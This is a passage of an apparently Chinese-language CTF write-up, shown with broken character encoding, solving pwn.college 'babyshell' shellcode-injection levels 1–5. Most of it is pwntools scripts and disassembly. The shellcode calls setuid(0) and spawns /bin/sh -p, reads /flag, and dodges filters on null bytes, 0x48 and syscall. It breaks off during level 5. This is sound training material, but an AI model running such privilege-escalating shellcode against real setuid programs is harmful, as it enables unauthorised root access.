çš„ä¿æŠ¤æœºåˆ¶ï¼š/bin/shç¬¦å·é“¾æ¥æŒ‡å‘çš„æ˜¯/bin/dashï¼Œdashå’Œbashéƒ½æœ‰é˜²å¾¡æœºåˆ¶ï¼Œå½“å®ƒä»¬å‘ç°è‡ªå·±æ˜¯åœ¨setuidè¿›ç¨‹ä¸­è¢«æ‰§è¡Œçš„æ—¶å€™ï¼Œå°±ä¼šeuidä¸ºè¿›ç¨‹çš„çœŸå®ç”¨æˆ·idï¼Œæ”¾å¼ƒç‰¹æƒ</p><p>é‡æä¸€ä¸‹ç›¸å…³æ¦‚å¿µ</p><ul><li>eUIDï¼ˆEffective User IDï¼‰ï¼šè¡¨ç¤ºæ­£åœ¨æ‰§è¡Œå‘½ä»¤çš„è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ·IDã€‚</li><li>rUIDï¼ˆReal User IDï¼‰ï¼šè¡¨ç¤ºæ­£åœ¨æ‰§è¡Œå‘½ä»¤çš„è¿›ç¨‹çš„çœŸå®ç”¨æˆ·IDã€‚</li></ul><p>ä¸€èˆ¬è¿™ä¿©IDä¸€æ ·ã€‚ä½†æ˜¯å¦‚æœç¨‹åºæ˜¯ suid ç¨‹åºé‚£ä¹ˆ ruid ä¿æŒåŸæ ·ï¼Œ euid æ˜¯ rootï¼Œç¨‹åºä»¥ root æƒé™æ‰§è¡Œ</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœ<code>/bin/sh</code>è¢«è®¾ç½®ä¸ºSUIDæƒé™ï¼ˆsuidæ ‡å¿—è¢«è®¾ç½®ï¼Œå³eUIDä¸º0ä½†rUIDä¸ä¸º0ï¼‰ï¼Œå®ƒå°†é™ä½æƒé™åˆ°rUIDã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒeUIDå°†è¢«è®¾ç½®ä¸ºrUIDçš„å€¼ï¼Œè€ŒrUIDä¸ä¸º0ã€‚</p><p>ä¸ºäº†ç¦ç”¨è¿™ç§è¡Œä¸ºï¼Œå¯ä»¥ä½¿ç”¨<code>sh -p</code>å‘½ä»¤æ¥æ‰§è¡Œ<code>/bin/sh</code>ã€‚<code>-p</code>é€‰é¡¹å°†ä½¿<code>/bin/sh</code>ä¿æŒSUIDæƒé™ï¼Œè€Œä¸ä¼šé™ä½ä¸ºrUID</p><p>ç»¼ä¸Šæœ‰ä¿©æ–¹å¼ï¼š</p><ul><li>æ‰§è¡Œ/bin/sh -p</li><li>æ‰§è¡Œ/bin/sh ä¹‹å‰å°† euid ç½®ä¸º 0</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level1&#x27;</span>)<br><br><span class="hljs-comment"># æ‰§è¡Œ /bin/sh ä»¥è·å–ç‰¹æƒshell</span><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    xor    rdi, rdi              # è®¾ç½® rdi å¯„å­˜å™¨ä¸º 0ï¼Œè¡¨ç¤ºè®¾ç½®å½“å‰è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ· ID</span><br><span class="hljs-string">    mov    eax, 0x69             # å°†ç³»ç»Ÿè°ƒç”¨å· 105 (setuid) æ”¾å…¥ eax å¯„å­˜å™¨</span><br><span class="hljs-string">    syscall                      # æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè®¾ç½®å½“å‰è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ· ID ä¸º 0ï¼ˆrootï¼‰</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    mov    rax, 59               # è®¾ç½® rax å¯„å­˜å™¨ä¸º 59ï¼Œè¡¨ç¤ºç³»ç»Ÿè°ƒç”¨ execve</span><br><span class="hljs-string">    lea    rdi, [rip+binsh]      # å°† /bin/sh å­—ç¬¦ä¸²åœ°å€æ”¾å…¥ rdi å¯„å­˜å™¨</span><br><span class="hljs-string">    xor    rsi, rsi              # å°† rsi å¯„å­˜å™¨ç½®é›¶</span><br><span class="hljs-string">    xor    rdx, rdx              # å°† rdx å¯„å­˜å™¨ç½®é›¶</span><br><span class="hljs-string">    syscall                      # æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œå¯åŠ¨ /bin/sh</span><br><span class="hljs-string"></span><br><span class="hljs-string">binsh:</span><br><span class="hljs-string">    .string &quot;/bin/sh&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>shellcode = asm(shellcode)<br><br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="æ€è·¯2"><a href="#æ€è·¯2" class="headerlink" title="æ€è·¯2"></a>æ€è·¯2</h2><p>ç”±äºæ˜¯ suid ç¨‹åºï¼Œå› æ­¤å¯ä»¥ç›´æ¥æ‰§è¡Œ cat /flag å‘½ä»¤è¯»å–å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>p=process(<span class="hljs-string">&quot;/challenge/babyshell_level1&quot;</span>)<br><br>shellcode=shellcraft.cat(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode=asm(shellcode)<br><br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>åœ¨ 1 çš„åŸºç¡€ä¸ŠåŠ äº†é€»è¾‘</p><ul><li>å¯¹æ ‡å‡†è¾“å…¥çš„shellcodeéšæœºè·³è¿‡ä¸€æ®µé•¿åº¦ï¼ˆ0x100åˆ°0x800å­—èŠ‚ï¼‰</li></ul> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">srand(time(<span class="hljs-literal">NULL</span>));<br><span class="hljs-keyword">int</span> to_skip = (rand() % <span class="hljs-number">0x700</span>) + <span class="hljs-number">0x100</span>;<br>shellcode_mem += to_skip;<br>shellcode_size -= to_skip;<br> <br></code></pre></td></tr></table></figure><p>æ€è·¯</p><ul><li>æŠŠshellcode æ”¾åˆ°åé¢ï¼Œå‰é¢ç”¨æŒä½°ä¸ª nop å¡«å……</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>p = process(<span class="hljs-string">&quot;/challenge/babyshell_level2&quot;</span>)<br><br><span class="hljs-comment"># ç¼–å†™shellcodeï¼šè¯»å–&quot;/flag&quot;æ–‡ä»¶çš„å†…å®¹</span><br>shellcode = shellcraft.cat(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode = asm(shellcode)<br><br>nop_sled_length = <span class="hljs-number">0x800</span><br>nop_sled = asm(<span class="hljs-string">&#x27;nop&#x27;</span>) * nop_sled_length<br><br><span class="hljs-comment"># å°†nop sledå’Œshellcodeæ‹¼æ¥</span><br>payload = nop_sled + shellcode<br><br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>åœ¨1 çš„åŸºç¡€ä¸ŠåŠ å…¥äº† <strong>Shellcodeè¿‡æ»¤</strong>ï¼šæ£€æŸ¥è¯»å…¥çš„shellcodeæ˜¯å¦åŒ…å«NULLå­—èŠ‚ï¼ˆ<code>\x00</code>ï¼‰</p><p>disasm å‡½æ•°å¯ä»¥æ–¹ä¾¿çš„çœ‹åˆ°å­—èŠ‚ç å’Œæ±‡ç¼–</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">print(disasm(shellcode))<br><br>   <span class="hljs-number">0</span>:   <span class="hljs-number">48</span> b8 <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span>   movabs <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x101010101010101</span><br><span class="hljs-symbol">   a:</span>   <span class="hljs-number">50</span>                      <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">   b:</span>   <span class="hljs-number">48</span> b8 2e <span class="hljs-number">67</span> <span class="hljs-number">6d</span> <span class="hljs-number">60</span> <span class="hljs-number">66</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span>   movabs <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x1010166606d672e</span><br>  <span class="hljs-number">15</span>:   <span class="hljs-number">48</span> <span class="hljs-number">31</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>             <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rsp</span>], <span class="hljs-built_in">rax</span><br>  <span class="hljs-number">19</span>:   6a <span class="hljs-number">02</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x2</span><br>  <span class="hljs-number">1b</span>:   <span class="hljs-number">58</span>                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rax</span><br>  1c:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e7                <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>  1f:   <span class="hljs-number">31</span> f6                   <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">esi</span><br>  <span class="hljs-number">21</span>:   0f <span class="hljs-number">05</span>                   <span class="hljs-keyword">syscall</span> <br>  <span class="hljs-number">23</span>:   <span class="hljs-number">41</span> ba ff ff ff 7f       <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r10d</span>, <span class="hljs-number">0x7fffffff</span><br>  <span class="hljs-number">29</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> c6                <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br>  2c:   6a <span class="hljs-number">28</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x28</span><br>  2e:   <span class="hljs-number">58</span>                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rax</span><br>  2f:   6a <span class="hljs-number">01</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x1</span><br>  <span class="hljs-number">31</span>:   5f                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span><br>  <span class="hljs-number">32</span>:   <span class="hljs-number">99</span>                      <span class="hljs-keyword">cdq</span>    <br>  <span class="hljs-number">33</span>:   0f <span class="hljs-number">05</span>                   <span class="hljs-keyword">syscall</span><br>  <br>  <br>print(<span class="hljs-string">&quot;Does shellcode contain NULL bytes?&quot;</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span> <span class="hljs-keyword">in</span> shellcode)<br><br>Does shellcode contain NULL bytes? False<br></code></pre></td></tr></table></figure><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯ 1"></a>æ€è·¯ 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>p = process(<span class="hljs-string">&quot;/challenge/babyshell_level3&quot;</span>)<br><br>shellcode=shellcraft.cat(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode=asm(shellcode)<br><span class="hljs-built_in">print</span>(shellcode)<br><span class="hljs-built_in">print</span>(disasm(shellcode))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Does shellcode contain NULL bytes?&quot;</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> <span class="hljs-keyword">in</span> shellcode)<br><br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯ 2"></a>æ€è·¯ 2</h2><p>pushstr å¯ä»¥å°†å­—ç¬¦ä¸²å‹æ ˆä½†æ˜¯ä¸å¼•å…¥<code>\x00</code></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">pwnlib.shellcraft.amd64.linux.<span class="hljs-built_in">read</span>(fd=<span class="hljs-number">0</span>, buffer=<span class="hljs-string">&#x27;rsp&#x27;</span>, count=<span class="hljs-number">8</span>)[source]<br><br>Reads data <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> descriptor <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> provided buffer. This is <span class="hljs-keyword">a</span> <span class="hljs-literal">one</span>-shot <span class="hljs-keyword">and</span> does <span class="hljs-keyword">not</span> fill <span class="hljs-keyword">the</span> request.<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>p = process(<span class="hljs-string">&quot;/challenge/babyshell_level3&quot;</span>)<br><br><span class="hljs-comment"># ä½¿ç”¨ pushstr å‹å…¥ &quot;/flag&quot; å­—ç¬¦ä¸²è€Œä¸åŒ…å« NULL å­—èŠ‚</span><br>shellcode = shellcraft.pushstr(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br><span class="hljs-comment"># æ‰“å¼€æ–‡ä»¶</span><br>shellcode += shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rsp&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># &#x27;rsp&#x27; æŒ‡å‘åˆšæ¨é€çš„å­—ç¬¦ä¸²</span><br><span class="hljs-comment"># è¯»å–æ–‡ä»¶å†…å®¹</span><br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-string">&#x27;rsp&#x27;</span>, <span class="hljs-number">1024</span>)  <span class="hljs-comment"># å‡è®¾æˆ‘ä»¬è¯»å–æœ€å¤š1024å­—èŠ‚</span><br><span class="hljs-comment"># å°†æ–‡ä»¶å†…å®¹å†™åˆ°æ ‡å‡†è¾“å‡º</span><br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rsp&#x27;</span>, <span class="hljs-string">&#x27;rax&#x27;</span>)<br><br>shellcode += shellcraft.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># ç¼–è¯‘ shellcode</span><br>binary_code = asm(shellcode)<br><br><span class="hljs-comment"># æ‰“å°ç”Ÿæˆçš„ shellcode æ£€æŸ¥æ˜¯å¦åŒ…å« NULL å­—èŠ‚</span><br><span class="hljs-built_in">print</span>(disasm(binary_code))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Does shellcode contain NULL bytes?&quot;</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> <span class="hljs-keyword">in</span> binary_code)<br><br><br>p.send(binary_code)<br><br>p.interactive()<br><br>--- <br><br>   <span class="hljs-number">0</span>:   <span class="hljs-number">48</span> b8 01 01 01 01 01 01 01 01   movabs rax, <span class="hljs-number">0x101010101010101</span><br>   a:   <span class="hljs-number">50</span>                      push   rax<br>   b:   <span class="hljs-number">48</span> b8 2e <span class="hljs-number">67</span> 6d <span class="hljs-number">60</span> <span class="hljs-number">66</span> 01 01 01   movabs rax, <span class="hljs-number">0x1010166606d672e</span><br>  <span class="hljs-number">15</span>:   <span class="hljs-number">48</span> <span class="hljs-number">31</span> 04 <span class="hljs-number">24</span>             xor    QWORD PTR [rsp], rax<br>  <span class="hljs-number">19</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e7                mov    rdi, rsp<br>  1c:   <span class="hljs-number">31</span> d2                   xor    edx, edx<br>  1e:   <span class="hljs-number">31</span> f6                   xor    esi, esi<br>  <span class="hljs-number">20</span>:   6a 02                   push   <span class="hljs-number">0x2</span><br>  <span class="hljs-number">22</span>:   <span class="hljs-number">58</span>                      pop    rax<br>  <span class="hljs-number">23</span>:   0f 05                   syscall <br>  <span class="hljs-number">25</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7                mov    rdi, rax<br>  <span class="hljs-number">28</span>:   <span class="hljs-number">31</span> c0                   xor    eax, eax<br>  2a:   <span class="hljs-number">31</span> d2                   xor    edx, edx<br>  2c:   b6 04                   mov    dh, <span class="hljs-number">0x4</span><br>  2e:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e6                mov    rsi, rsp<br>  <span class="hljs-number">31</span>:   0f 05                   syscall <br>  <span class="hljs-number">33</span>:   6a 01                   push   <span class="hljs-number">0x1</span><br>  <span class="hljs-number">35</span>:   5f                      pop    rdi<br>  <span class="hljs-number">36</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> c2                mov    rdx, rax<br>  <span class="hljs-number">39</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e6                mov    rsi, rsp<br>  3c:   6a 01                   push   <span class="hljs-number">0x1</span><br>  3e:   <span class="hljs-number">58</span>                      pop    rax<br>  3f:   0f 05                   syscall <br>  <span class="hljs-number">41</span>:   <span class="hljs-number">31</span> ff                   xor    edi, edi<br>  <span class="hljs-number">43</span>:   6a 3c                   push   <span class="hljs-number">0x3c</span><br>  <span class="hljs-number">45</span>:   <span class="hljs-number">58</span>                      pop    rax<br>  <span class="hljs-number">46</span>:   0f 05                   syscall<br></code></pre></td></tr></table></figure><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>ä¸å¯ä»¥å‡ºç° <code>\x48</code>ï¼Œä¹Ÿå³æ˜¯ H</p><p>ä½†æ˜¯å¯¹64 ä½å¯„å­˜å™¨è¿›è¡Œæ“ä½œï¼Œæˆ–è€…å¤„ç†QWORD è¿™ç§ 64 ä½æ•°æ®ï¼Œå°±ä¼šåœ¨æŒ‡ä»¤çº§åˆ«åŠ ä¸Šç¥å¥‡çš„ REXï¼Œä¸ä¹‹å¯¹åº”çš„ï¼Œå¯¼è‡´<code>\x48</code>çš„å‡ºç°</p><p>è¯¸å¦‚<code>mov</code>Â æŒ‡ä»¤åœ¨æ“ä½œ 64 ä½å¯„å­˜å™¨æ—¶ï¼Œéœ€è¦ä½¿ç”¨ REX å‰ç¼€ã€‚è¿™æ—¶åœ¨å­—èŠ‚ç ä¸­ä¼šå‡ºç°Â <code>\x48</code>Â å‰ç¼€ã€‚</p><p>ä½†æ˜¯ï¼Œ<code>push</code>Â  å’Œ <code>pop</code>æŒ‡ä»¤åœ¨æ“ä½œ 64 ä½å¯„å­˜å™¨ï¼ˆå¦‚Â <code>push rax</code>ï¼‰æ—¶ï¼Œå¹¶ä¸éœ€è¦ REX å‰ç¼€ï¼Œå› ä¸ºÂ <code>push</code>Â æœ¬èº«å°±æ˜¯é’ˆå¯¹ 64 ä½æ ˆçš„æ“ä½œã€‚å› æ­¤ï¼Œ<code>push</code>Â æŒ‡ä»¤å¯¹åº”çš„äºŒè¿›åˆ¶ç¨‹åºå­—èŠ‚ç ä¸­ä¸ä¼šå‡ºç°Â <code>\x48</code>Â å‰ç¼€</p><p>æƒ³è§£å†³æ­¤é¢˜ï¼Œåªéœ€ä½¿ç”¨ push popè§¦å‘<code>execve(filepath, argv, envp)</code>å‡½æ•°</p><ul><li>filepathï¼šâ€/bin/shâ€ï¼ˆå­—ç¬¦ä¸²åœ°å€ï¼‰</li><li>argv<ul><li><code>argv[0]:&quot;/bin/sh\0&quot;</code></li><li><code>argv[1]:&quot;-p\0&quot;</code></li></ul></li><li>envp</li></ul><p>æ‰€ä»¥æœ¬è´¨ä¸Šæ˜¯åšäº†è¿™ä¸¤ä¸ªäº‹</p><ul><li>æ„é€ å‚æ•°æ•°ç»„<ul><li>æ•°ç»„åœ¨å†…å­˜ä¸­çš„ç»„ç»‡æ–¹å¼</li><li>è€ƒè™‘ä¸‹å¤šç»´æ•°ç»„å’Œå­—èŠ‚åºé—®é¢˜</li><li>è¿™æ¶‰åŠåˆ°ä¸€äº›æŒ‡é’ˆ</li></ul></li><li>è°ƒç”¨ execve ç³»ç»Ÿè°ƒç”¨</li></ul><p><code>/bin//sh</code>å­—ç¬¦ä¸²æƒ³è¦å…¥æ ˆè¯¥æ€ä¹ˆæ“ä½œï¼Ÿå¦‚æœ<del>pushè¿›å»æˆ–è€…</del> mov ä¼šä¸å¯é¿å…çš„æ¶‰åŠåˆ°<code>\x48</code>ã€‚å› æ­¤å¯ä»¥åˆ©ç”¨callå‡½æ•°æ—¶ä¼šå°†è¿”å›åœ°å€å‹æ ˆçš„ç‰¹æ€§ï¼Œå°†å­—ç¬¦ä¸²çš„åœ°å€å‹å…¥æ ˆï¼Œè¿™æ ·å°±å¯ä»¥è·å–åœ°å€ä¸”ç»•è¿‡ 48</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyshell_level4&quot;</span>)<br><br>shellcode = asm(<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    jmp two</span><br><span class="hljs-string">one:</span><br><span class="hljs-string">    pop rdi // get file path,the 1st arg</span><br><span class="hljs-string"></span><br><span class="hljs-string">    push 0x0  //end of -p</span><br><span class="hljs-string">    push 0x702d // -p</span><br><span class="hljs-string">    push rsp   // addr of -p</span><br><span class="hljs-string">    pop rdx // rdx &lt;- addr</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    push 0x0  //end of argv</span><br><span class="hljs-string">    push rdx  //addr of -p</span><br><span class="hljs-string">    push rdi  //addr of /bin/sh</span><br><span class="hljs-string">    push rsp  //addr of argv</span><br><span class="hljs-string">    pop rsi   //rsi &lt;- addr of argv,the 2st arg</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    push 0x0  //envp</span><br><span class="hljs-string">    pop rdx   //rdx &lt;- 0</span><br><span class="hljs-string">    push 0x3b </span><br><span class="hljs-string">    pop rax   //rax &lt;- 0x3b</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">two:</span><br><span class="hljs-string">    call one</span><br><span class="hljs-string">    .string &quot;/bin/bash&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>)<br><br>p.send(shellcode)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><p>ç¦ç”¨ 0x0f05ï¼Œå› æ­¤éœ€è¦é€šè¿‡åŠ¨æ€ä¿®æ”¹å­—èŠ‚æ¥è¾¾æˆ syscall è°ƒç”¨</p><p>æ­¤è·¯ä¸é€šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>p = process(<span class="hljs-string">&#x27;/challenge/babyshell_level5&#x27;</span>)<br><br><span 